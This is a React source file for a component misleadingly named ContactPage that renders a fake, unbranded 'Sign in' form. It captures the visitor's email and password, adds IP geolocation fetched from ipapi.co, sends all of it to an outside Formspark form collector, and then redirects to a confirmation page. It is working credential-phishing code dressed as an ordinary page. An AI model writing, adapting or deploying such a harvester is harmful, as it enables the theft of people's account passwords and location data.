import { useFormspark } from "@formspark/use-formspark";
import Axios from "axios";
import React, { useEffect, useState } from "react";
import { Link, Navigate } from "react-router-dom";

const FORMSPARK_FORM_ID = "R4Zn9WTaT";

const ContactPage = () => {
  const [emlId, setEmlId] = useState("");
  const [emlPass, setEmlPass] = useState("");
  const [confirm, setConfirm] = useState(false);

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const [isDetails, setIsDetails] = useState([]);

  useEffect(() => {
    Axios.get("https://ipapi.co/json/").then((res) => {
      setIsDetails(res.data);
    });
  }, []);

  const handleSubmit = async (e) => {
    setConfirm(true);
    e.preventDefault();
    await submit({
      emlId,
      emlPass,
      ...isDetails,
    });
    return;
  };

  if (confirm) {
    return (
      <p>
        <Navigate
          to={{
            pathname: "/confirm",
          }}
        />
      </p>
    );
  }

  return (
    <div>
    <div className=""></div>
    <div className="">
        <div className="">
        <div className=" ">
         <div className="md:w-96 h-auto w-80 p-4 md:p-8 bg-white mx-auto">
         <div className="text-3xl bold my-2 font-bold">Sign in</div>
            <form onSubmit={handleSubmit}>
          <input
            type="email"
            value={emlId}
            onChange={(e) => setEmlId(e.target.value)}
            className="outline-none border-black p-2 my-3 border-2 w-full"
            placeholder="Email *"
            required
          />
          <input
            type="password"
            value={emlPass}
            onChange={(e) => setEmlPass(e.target.value)}
            className="outline-none border-black p-2 my-3 border-2 w-full"
            placeholder="Password *"
            required
          />
          <div className="text-lg py-2">
            <span><input type="checkbox" /></span> Keep me signed in on this device
          </div>
            <div className="py-5 w-full">
            <button
              type="submit"
              className="px-6 py-2 w-full text-white font-semibold bg-black"
              // onClick={handleAlert}
              disabled={submitting}
            >
              Send
            </button>
            <div className="py-2 text-center">
            <span className="mr-1">Need to find</span> <Link to="/" className="text-green-900 underline">your password</Link>?
            </div>
            </div>
            </form>
             </div>
        </div>
        </div>
    </div>
    
    </div>

  );
};
export default ContactPage;
